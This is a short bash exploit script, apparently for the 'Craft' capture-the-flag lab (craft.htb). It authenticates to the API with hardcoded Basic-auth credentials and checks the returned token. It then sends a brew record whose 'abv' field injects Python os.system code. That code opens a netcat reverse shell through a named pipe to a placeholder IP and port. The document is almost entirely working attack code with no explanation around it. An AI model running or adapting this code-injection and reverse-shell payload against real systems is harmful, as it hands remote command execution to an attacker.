#!/bin/bash

# Retrieves a token from the API
TOKEN=$(curl -k -X GET -H "Content-Type: application/json" -H "Authorization: Basic ZGluZXNoOjRhVWgwQThQYlZKeGdk" https://api.craft.htb/api/auth/login 2>/dev/null | awk -F "\"" {'print $4'})

# Checks the token against the API for validity
RESPONSE=$(curl -k -X GET -H "Content-Type: application/json" -H "X-Craft-Api-Token: $TOKEN" https://api.craft.htb/api/auth/check 2>/dev/null | awk -F "\"" {'print $4'})

if [ "$RESPONSE" != 'Token is valid!' ];
then
    echo "$RESPONSE";
    exit;
fi

# Exploit the API and trigger a reverse shell
curl -k -H "Content-Type: application/json" -H "X-Craft-Api-Token: $TOKEN" -X POST "https://api.craft.htb/api/brew/" --data "{\"abv\":\"__import__('os').system('mkfifo /tmp/epic; nc IP PORT 0</tmp/epic | /bin/sh >/tmp/epic 2>&1; rm /tmp/epic') == 0.15\",\"name\":\"Rail Yard Ale (2009)\",\"brewer\":\"Wynkoop Brewing Company\",\"style\":\"American Amber / Red Ale\"}"

